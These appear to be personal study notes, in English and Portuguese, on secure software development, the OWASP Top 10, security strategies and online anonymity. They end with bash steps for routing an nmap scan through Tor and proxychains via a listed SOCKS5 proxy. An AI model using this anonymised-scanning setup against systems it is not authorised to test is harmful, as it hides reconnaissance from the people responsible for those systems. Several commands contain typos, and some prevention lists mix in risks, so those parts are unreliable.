	- <span style="color: #98971a">Static Reviewer</span> <span style="color: #3588E9">--></span> eliminates well-known vulnerabilities. A component within the Security Reviewer suite, it is compliant with frameworks including <span style="color: #d65d0e">Open Web Application Security Project</span> (or OWASP), <span style="color: #d65d0e">Common Vulnerabilities and Exposures</span> (or CVEs), and the <span style="color: #d65d0e">National Institute of Standards and Technology</span> (or NIST).
###### <strong style="color: #689d6a">Threat modeling</strong> 

<span style="color: #3588E9">--></span> identifying, categorizing, and enumerating security threats. It provides a process to analyze ongoing threats to eliminate software weaknesses and vulnerabilities.

> Detect ---> Analyze ---> Eliminate

It uses diagrams to visually represent data flows within software applications.

Threat modeling belong in the <strong style="color:#d79921">Design phase of SDLC</strong> <span style="color: #3588E9">--></span> early eliminating for weaknesses in developed applications.

- <strong style="font-weight: 600">Models:</strong>
	- <span style="color: #98971a">Process for Attack Simulation and Threat Analysis (PASTA)</span> <span style="color: #3588E9">--></span> risk-based model that connects to business objectives and technical requirements.
	- <span style="color: #98971a">Visual, Agile and Simple Threat (VAST)</span> <span style="color: #3588E9">--></span> agile methodology with application threat models and operational threat models. It uses process-flow diagrams to represent the architectural perspective.
	- <span style="color: #98971a">STRIDE</span> <span style="color: #3588E9">--></span> stands for Spoofing identity, Tampering with data, Repudiation, Information disclosure, Denial of service, and Elevation of privileges. It came from Microsoft, which evaluates applications and systems to find threats and vulnerabilities.
###### <strong style="color: #689d6a">Threat monitoring</strong> 

<span style="color: #3588E9">--></span> scanning code repositores and containers to find security issues, such as password mishandling, protocol insecurities, and incorrect permissions.

It takes place during the Develop stage, the Test stage, and the Deploy stage of SDLC.

Use code scanning tools in IDEs and SCM to integrate security checks.

Code scanning tools <strong style="color: #b16286">reference databases that store security threats and vulnerabilities</strong> such as the Open Web Application Security Project (or OWASP) Top 10.

Threat monitoring can be performed using <span style="color: #d65d0e">code checker tools</span> <span style="color: #3588E9">--></span> it <strong style="color: #b16286">scans source code for any security issues and vulnerabilities</strong>, which will alert you to coding problems. Code checker analyzes code for attributes such syntax, style and documentation. It also provides insights to fix issues.

<span style="color: #d65d0e">Code scanners</span> provide vulnerability reporting and insights after they scan code in the repositories. They also scan and test every pull request for security vulnerabilities, and sign commits with a public encryption or pretty good privacy (PGP) key as verification of trusted sources.

<span style="color: #d65d0e">Container scanning</span> <span style="color: #3588E9">--></span> process of scanning container images that contain code. container scanning must include not only the base image but all the other layered container images as well.
###### <strong style="color: #689d6a">Code review</strong> 

<span style="color: #3588E9">--></span> it uses automated static analysis security testing and perform manual code inspection.

Focus on exposed threats or source code containing security-critical components

Search for logic flaws

Review of specification implementation

Verification of style rules

<span style="color: #3588E9">--></span> It can implement code review during <strong style="color:#d79921">any stage</strong> of the SDLC.

- <strong style="color:#d79921">Types of code reviews</strong>
	- <span style="color: #98971a">Automated</span> <span style="color: #3588E9">--></span> evaluate large code bases fast and efficiently
		- uncover vulnerabilities in real time
		- use static analysis security testing (SAST) tools for extra inputs
	- <span style="color: #98971a">Manual</span> <span style="color: #3588E9">--></span> detects problem that test overlook
		- find mistakes unnoticed on the first pass
		- requires an understanding of app control and logic flows
		- <strong style="color:#c6554f">Obs:</strong> <span style="color:#c6554f">Repeats at every pull request!!</span>
###### <strong style="color: #689d6a">Runtime Protection</strong>

<span style="color: #3588E9">--></span> modern security mechanism that shields applications against threats while the applications are running.

Can be achieved by using security tools such as Interactive Application Self-testing (or IAST) or Runtime Application Self-Protection (or RASP).

- <span style="color: #98971a">IAST</span>
	- scans for vulnerabilities during the testing.
	- detects security flaws in real time while the application is operating.
	- runs concurrently with other automated process.
	- <strong style="font-weight: 600">Features:</strong>
		- low false-positive output following the real-time examination of the application.
		- simple integration into CI/CD.
		- earlier, quicker, and less expensive fixes.
		- ability to scale up
- <span style="color: #98971a">RASP</span>
	- scans for assaults in the production environment
	- visibility into risky code sections
	- helps to identify and prevent assaults in real time
	- <strong style="font-weight: 600">Features:</strong>
		- protects against exploitation
		- works directly within an application
		- prevents attacks with great precision
		- supports DevOps
		- supports cloud computing
###### <strong style="color: #689d6a">Software Composition Analysis</strong> 

<span style="color: #3588E9">--></span> process of determining open source components and dependencies.

Use of tools to ensure that imported libraries or dependencies do not introduce risks or issues.

SCA tools can identify third-party issues in software libraries through the National Vulnerability Database (NVD) <span style="color: #3588E9">--></span> sevelopers submit various software vulnerabilities to this database for public reference.

- <strong style="font-weight: 600">Features:</strong>
	- looks for all dependencies linked to code
	- looks for libraries that have a GPL license
	- gives developers control of security flaws
- <strong style="font-weight: 600">Goals</strong>
	- Discovery and tracking of all open source components
	- Reduction of risk from tracking open source license compliance
	- Identification of open source vulnerabilities
	- Variety of scans depending on situation and requirements
<br>
- <strong style="color: #d79921">Software Components</strong>
	- <span style="color: #98971a">NIST CPE Dictionary</span> <span style="color: #3588E9">--></span> centralized database for common platform enumeration (or CPE) of products
	- <span style="color: #98971a">Software Identification (SWID) Tags</span> <span style="color: #3588E9">--></span> standard to describe commercial software
	- <span style="color: #98971a">Package URL specification</span> <span style="color: #3588E9">--></span> Example: <code>Scheme:type/namespace/name@version?qualifiers#subpath</code>

Two sands for verifying software components: OWASP Software Component Verficiation Standard (SCVS) and Supply chain Levels ofr Software Artifacts (SLSA).
- SCVS --> community-supported effort to build a sustainable framework for reducing risk within a software supply chain
- SLSA --> provides a security framework for improving integrity and preventing tampering by implementing standards and controls
<br>
- <strong style="color: #d79921">SCA Tools</strong>
	- <span style="color: #98971a">GitHub SCA</span> <span style="color: #3588E9">--></span> or viewing dependency packages and vulnerabilities while using GitHub.com
	- <span style="color: #98971a">OWASP Dependency-Check</span> <span style="color: #3588E9">--></span> for checking for vulnerabilities within project dependencies
	- <span style="color: #98971a">OWASP Dependency-Track</span> <span style="color: #3588E9">--></span> for identifying any risks within the software supply chain
	- <span style="color: #98971a">Snyk</span> <span style="color: #3588E9">--></span> for analyzing codebases to evaluate security, code quality, and licensing
###### <strong style="color: #689d6a">Continuous Security Analysis</strong>

<span style="color: #3588E9">--></span> ongoing integration and testing of security within the software development lifecycle (or SDLC).

> Requirements ---> Design ---> Develop ---> Test ---> Deploy

- <strong style="font-weight: 600">Goals</strong>
	- Reduce security risks
	- Remove potential bottlenecks
	- Deliver faster software releases

<span style="color: #3588E9">--></span> The implementation of continuous security analysis, allows to create a secure SDLC for the organization.

- <strong style="font-weight: 600">Best practices</strong>
	- Require planning to audit security issues throughout the process
	- Develop code on up-to-date software and operating
	- Analyze all components to build security into the full stack
	- Implement SAST and SCA with continuous security analysis

- <strong style="font-weight: 600">Benefits</strong>
	- integrate continuous security analysis directly CI/CD
	- fix security issues early in the development process
	- accelerates new feature development
	- automate security requirements for existing and new application development
	- improves software ownership and responsibility among developers
	- secure coding becomes a default developmental style
<br>
- <span style="color: #98971a">Snyk</span> <span style="color: #3588E9">--></span> open source tool
	- finds and fixes vulnerabilities in open source libraries.
	- finds licensing issues caused by open source libraries.
	- offers advice for fixing vulnerabilities during development
	- fixes vulnerabitlities in SCM
	- prioritizes issues and reports newly discovered vulnerabitlities
###### <strong style="color: #d79921">OWASP Top 10 - 2021</strong> 

OWASP is the Open Web Application Security Project.

OWASP is a foundation that focuses on software security

The OWASP Top 10 is a report that identifies current software security vulnerability concerns. It represents a consensus from the OWASP core team, security analysts, security organizations, and other security experts.

<strong style="color:  white">Vulnerabilities</strong>

- <span style="color: #98971a">broken access control</span> <span style="color: #3588E9">--></span> when attackers can access, modify, delete, or perform actions outside of an application or system’s intended permissions.
	- Exploited access control vulnerabilities compromise data, tarnish company image, could result in financial losses.
	- Hackers try changing info in URLs to see what happens.
	- <strong style="color: white">Preventions:</strong>
		- Assing limited privileges. Keeps users confined to authorized work areas.
		- Regular Access Control checks. Admins always aware of access levels.
		- Distribute limited public information. Publish only what is necessary.
		- Disable directory listing in URLs. Keeps web server safe
		- Promptly alert admins when access controls failures appear in logs
---
- <span style="color: #98971a">cryptographic failures</span> <span style="color: #3588E9">--></span> attackers can easily decrypt traditional encryption methods
	- <strong style="font-weight: 600">Preventions:</strong>
		- Encrypt all sensitive data stored in the database using authenticated encryption.
		- Encrypt data at rest and in transit.
		- Avoid old protocols such as SMTP, and FTP to prevent man-in-the-middle attacks.
	- <strong style="font-weight: 600">Best practices:</strong>
		- Never hard-code keys in software applications.
		- Limit keys to single, specific purpose.
		- Practice key lifecycle and management process.
		- Back keys up regularly, store securely.
---
- <span style="color: #98971a">injection</span> <span style="color: #3588E9">--></span> untrusted  information is transmitted with a command or query to an interpreter.
	- Interpreter is fooled into allowing unauthorized data access.
	- Common injection attacks include SQL, OS, HTTP, LDAP, cross-site scripting, code injection.
	- <strong style="font-weight: 600">Preventions:</strong>
		- Use a secure API that avoids using the interpreter or offers a parametized interface.
		- Use an escape list to block keywords and special characters.
		- Keep keyword list updated.
		- Sanitize statements to see if attackers are using SELECT statements.
---
- <span style="color: #98971a">insecure design</span> <span style="color: #3588E9">--></span> lack of effective security controls in the design phase of an application
	- Leaves apps vulnerable
	- Nothing in place to reduce attacks
	- Focuses risks on design flaws
	- Perfect implementations still vulnerable
	- <strong style="font-weight: 600">Preventions:</strong>
		- Attackers continually search for exploits
		- Security measures needed for protection
		- Implement security during design phase
		- Appropriate security strategies are essential
		- Design with security in mind from the start
---
- <span style="color: #98971a">security misconfiguration</span> <span style="color: #3588E9">--></span> where overlooked configuration weaknesses where overlooked configuration weaknesses
	- unsafe features, modes not disabled
	- unauthorized access gained
	- elevated permissions acquired
	- not following principle of least privilege (PolP)
	- <strong style="font-weight: 600">Preventions:</strong>
		- remove components not needed
		- keep default permissions private
		- disable any defaults settings
		- backdoor accounts
		- configuration files in clear text
		- involve system admins in plan
---
- <span style="color: #98971a">vulnerable and outdated components</span> <span style="color: #3588E9">--></span> technology constantly evolving
	- updates continually releasing
	- know the versions of each component
	- platform can become easily outdated
	- app becomes vulnerable to attack
	- <strong style="font-weight: 600">Preventions:</strong>
		- no unused components
		- add risk when outdated
		- track installed components
		- track nested dependencies
		- track updated components for security awareness
		- monitor risks by OWASP and CISA
---
- <span style="color: #98971a">identification and authentication failures</span> <span style="color: #3588E9">--></span> credential stuffing, brute force, other automated attacks
	- sessions identifiers visible in URLs
	- no session timeouts
	- <strong style="font-weight: 600">Preventions:</strong>
		- software supply chain security tools
		- check and review configuration changes
		- no sensitive data to untrusted resources
		- multi factor authentication
		- server-side session manager
---
- <span style="color: #98971a">software and data integrity failures</span> <span style="color: #3588E9">--></span> caused by insecure code and weak infrastructure
	- app components from untrusted sources
	- no integrity checks for automatic updated
	- lead to breaches and other types of attacks
	- <strong style="font-weight: 600">Preventions:</strong>
		- Segregate CI/CD pipeline
		- Accurate configuration
		- Access control complete
		- Software supply chain security tools
		- No unsigned, unencrypted or serialized ata to untrusted clients
		- Digital signatures, integrity checks
---
- <span style="color: #98971a">logging and monitoring failures</span> <span style="color: #3588E9">--></span> 
	- inadequacies mask serious issues
	- weak log messages impair troubleshooting
	- auditable event not logged
	- log data overwritten not quickly
	- lack of monitoring system
	- infiltration goes undetected
	- <strong style="font-weight: 600">Preventions:</strong>
		- Straightforward log entries
		- Centralize and back them up
		- Include auditable events
		- Server-side input validation
		- Context for identifying suspecious accounts
		- Retention for delayed analysis
		- Implement monitoring system
		- Auditing logs peridically
---
- <span style="color: #98971a">server-side request forgery</span> <span style="color: #3588E9">--></span> allows external attackers to create or control malicious requests to other internal systems
	- SSRF attacks exploit a vulnerable server, by abusing the trust relationship between internal systems.
	- SSRF attacks also bypass firewalls, VPNs, and Access Control Lists (ACL).
	- Attackers can use the affected server to: scan for open ports on local or external networks, access local files, discover other IP addresses, and obtain remote code execution (or RCE).
	- Types of SSRF
		- Blind (basic) --> the attacker provides a URL to the affected server, but the data from the URL is never returned to the attacker.
		- Semi-blind --> the attacker provides a URL to the affected server, but only some data is exposed to the attacker that could potentially give them more information to use.
		- Non-blind --> data from any Uniform Resource Identifier (or URI) will be returned to the attacker by an internal service.
	- <strong style="font-weight: 600">Prevention:</strong>
		- Sanitize and validate input data
		- Create and use whitelists
		- Disallow HTTP redirects
		- Disallow raw responses without validation
## **Cyber Security Strategies**
---
<span style="color: #689d6a">Protect and Recover</span> <span style="color: #3588E9">--></span> it focuses on preventing an attacker from compromising a network by investing in protection technologies such as <span style="color: #98971a">firewalls, demilitarized zone, proxy serves, and micro-segmentations</span>. This strategy relies too much on networks administrators, vendors that create firewall and other security softwares to not make any mistake when it comes to configuration. This strategy doesn't address any type of insider threats or weak or stolen credentials.

<span style="color: #689d6a">Endpoint Protection</span> <span style="color: #3588E9">--></span> it focuses on protecting various endpoint devices and securing them the most. This strategy covers investing in various antivirus and anti-malware software, various vulnerability management softwares, host-based firewalls, application whitelisting, and web browser protections. All of this can be done in layers for additional security. One of the downside of this strategy is that a black hat hacker can downloads these softwares and test their programs and trojans as much as they want against these endpoint security software and try to bypass them. Others downsides of these strategy are: present vulnerabilities in these solutions, late patches, relies on a person, and a big variety of vulnerabilities.

<span style="color: #689d6a">Application Centric</span> <span style="color: #3588E9">--></span> it focuses on application security, but putting much more focus during development. The vulnerabilities checks are performed on the application code itself, seeing if there are any bugs of buffer overflows or incorrectly implemented functions. The environment to where the application will be deployed should also be checked. The development team should also check for different libraries or APIs that they are using. During production the the development team should add <span style="color: #98971a">static code analysis</span>, which is done multiple times, a <span style="color: #98971a">threat model</span> is also needed, and it's important to perform final checks before the application is put out of public. One of disadvantages of these strategy is: business value is hard to prove.

<span style="color: #689d6a">Identify Centric</span> <span style="color: #3588E9">--></span> it focuses on implementing authorization and authentication methods. A strong authentication can not only improve security, but it can also help us find out how we got compromised. The downside of using this strategy correctly is that it is rather complicated and expensive to implement. We have to collect and process all of this metadata from users and analyze it possible intrusions and attacks.

<span style="color: #689d6a">Data Centric</span> <span style="color: #3588E9">--></span> it focuses on the data itself and how it can be protected. This strategy involves the use of <span style="color: #98971a">encryption</span> and implementing <span style="color: #98971a">data loss prevention</span> and <span style="color: #98971a">key management</span>. It is meant to be combined with strategies such as endpoint security and physical security.

<span style="color: #689d6a">Attack Centric</span> <span style="color: #3588E9">--></span> it focuses on the attackers themselves. hot attacks thing and how the attackers thinks and what process does the attacker go through when planning out the attack. analyze multiple attack scenarios and history of attacks.
## **Anonymity and Privacy**
---
The most common type of tracking is tracking through an IP address. <strong>Every device</strong> that is connected to the internet <strong>must</strong> have and IP address.

<span style="color: #d65d0e">Private IP</span> <span style="color: #3588E9">--></span> is what we get inside of the home network, and it's only used for communications within the network and it's also not a unique IP address.

<span style="color: #d65d0e">Public IP</span> <span style="color: #3588E9">--></span> is unique and it can be used to track the used. The moment the used open the browser and load some website he's already being tracked by default.

<span style="color: #d65d0e">IP grabbers</span> <span style="color: #3588E9">--></span> certain links which can disclose our IP to the person that we sent that link to.

<a href=https://tools.keycdn.com/geo ><span style="color: #98971a">IP location finder</span></a> <span style="color: #3588E9">--></span> website to obtain information about the IP address.

- <span style="color:#d65d0e">Cookies</span> <span style="color: #3588E9">--></span> used essentially to track activity on a website. There are many types of cookies:
	- <span style="color: #689d6a">session cookies</span> only exist in temporary memory and are deleted when the browser is closed. They are used to remember the user's choices during their current session.
	- <span style="color: #689d6a">persistent cookies</span> are written onto the device's memory and come with an expiration date. They remain on the device even after the browser is closed.
	- <span style="color: #689d6a">third party persistent cookies</span> are accessed on website that didn't create them.

<span style="color: #98971a">Burp Suite</span> <span style="color: #3588E9">--></span> tool used to track or it is used as a proxy for the browser.

<span style="color: #d65d0e">Browser fingerprint</span> <span style="color: #3588E9">--></span> another layer that's being used to more precisely identify someone. besides of just tracking, it can be used to send to the user personalized ads as well. It can also track what operating system is being used or what plugins are active inside the browser, all of this gives and unique ID to the user.

O servidor DNS do provedor de internet entrega onde o usuário está. Por isso é mais interessante utilizar o DNS do google, ou buscar outros endereços de DNS como por exemplo, o <span style="color: #98971a">opendns</span>.

A aplicação web <span style="color: #98971a">DNS leak</span>  permite verificar o endereço IP.

<span style="color: #98971a">Tor browser</span> <span style="color: #3588E9">--></span> it changes the user's IP address after a certain amount of time. It will appear as if we are connecting from a different physical location. O <span style="color: #98971a">tor</span> permite encapsular o DNS dentro do tunelamento.

Utiliza o buscador <span style="color: #98971a">DuckDuckgo</span> para realizar pesquisas, pois ele não rastreia o que o usuário esta fazendo na web.

<span style="color: #98971a">Proxy chains</span> <span style="color: #3588E9">--></span> it's a tool that will allow us to filter our traffic through a proxy.

```bash
# Before using proxychains, we must install tor
sudo apt install tor

# Install proxychains
sudo apt install proxichains

# Verify tor service
sudo systemctl status tor

# Edit proxychains config file
sudo nano /etc/proxychains.conf
# on the config file: 
# uncomment dinamic_chan --> permite utilizar os proxies em sequencia, mas caso um não funcione, ele pula para o proximo.
# comment strict_chain
# socks4 não oferece suporte a todo tipo de protocolos.
# add socks5 support on port 9050

# test if it works
proxyhains firefox

# test with nmap
proxychains nmap nmap.org -F
```

<span style="color: #3588E9">--></span> O <span style="color: #98971a">proxychains4</span> é a nova versão do <span style="color: #98971a">proxychains</span>.

Adicionar novos <span style="color: #d65d0e">servidores proxies</span>, permitem complementar o <span style="color: #98971a">proxychains</span>

```bash
nano etc/proxyhcains4.conf

#socks4
#socks5
socks5 51.79.87.144 41746
```

A <span style="color: #d65d0e">VPN</span> é mais uma forma de melhorar a privacidade durantes os testes. O software no linux é o <span style="color: #98971a">openvpn</span>. 
- `openvpn vpnbook-de233-tcp80.vpn`